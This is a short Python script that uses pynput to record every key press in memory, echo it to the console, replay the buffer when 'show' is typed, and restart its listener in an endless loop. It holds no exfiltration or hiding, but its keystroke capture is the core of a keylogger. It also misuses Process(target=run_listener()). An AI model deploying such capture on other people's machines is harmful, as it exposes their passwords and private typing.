from pynput import keyboard
import time
from multiprocessing import Process
from print_text import *


input_keys = []
start_time = time.localtime()[4]

def on_press(key):
    try:
        input_keys.append(chr(ord(key.char)))
        print(chr(ord(key.char)))
    except:
        input_keys.append(str(key))

###     stop monitoring     ###
def on_release(key):
    try:
        show = input_keys[-1] == 'w' and input_keys[-2] == 'o' and input_keys[-3] == 'h' and input_keys[-4] == 's'
        if show:
        ###     enter 'show' to view the last memory keys       ###
            for i in range(4):
                input_keys.pop()
            output_text = "".join(input_keys)
            print_text(output_text)

        ###     press "c + delete" to stop monitoring       ###
        #stop = key == keyboard.Key.delete and input_keys[-2] == 'c'
        elif key == keyboard.Key.delete and input_keys[-2] == 'c':
                return False
    except:
        pass

###     keyboard listener      ###
def run_listener():
    with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()

def run_listener_forever():
    #stop = input_keys[-1] == keyboard.Key.delete and input_keys[-2] == 'c'
    while True:
        p = Process(target=run_listener())
        p.start()
        p.join()
        p.terminate()

run_listener_forever()